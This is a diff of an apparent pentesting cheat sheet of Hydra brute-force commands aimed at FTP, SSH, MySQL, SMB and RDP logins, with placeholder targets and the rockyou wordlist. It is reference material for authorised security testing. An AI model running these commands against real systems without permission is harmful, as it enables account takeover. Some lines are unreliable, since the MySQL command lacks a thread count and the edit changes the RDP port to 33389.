@@ -14,29 +14,29 @@ $ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.p
 
 ## FTP
 
-$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt [IP Address] ftp
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp
 
-$ hydra -L /dir/users.txt -P /dir/passlist.txt ftp://[IP_Address]
+$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt ftp://Target_IP
 
 ## SSH
 
 $ hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 ssh
 
-$ hydra -L /full/path_to/usernamelist.txt -P /full/path_to/passlist.txt ssh://IP_Address:2222
+$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt ssh://IP_Address:2222
 
 ## MySQL
 
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt IP Address Target -t mysql
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t mysql
 
 ## SMB
 
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt IP Address Target -t 4 smb
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 smb
 
 ## RDP
 
-$ hydra -l username -P <full path to passlist.txt> <IP Address> rdp
+$ hydra -l username -P /usr/share/wordlists/rockyou.txt Target_IP rdp
 
-$ hydra -L full/path_to_usernamelist.txt -P full/path_to_passlist.txt -t 4 -W 3 rdp://IP_Address:3389/
+$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt -t 4 -W 3 rdp://IP_Address:33389/
 
 ## Links
 
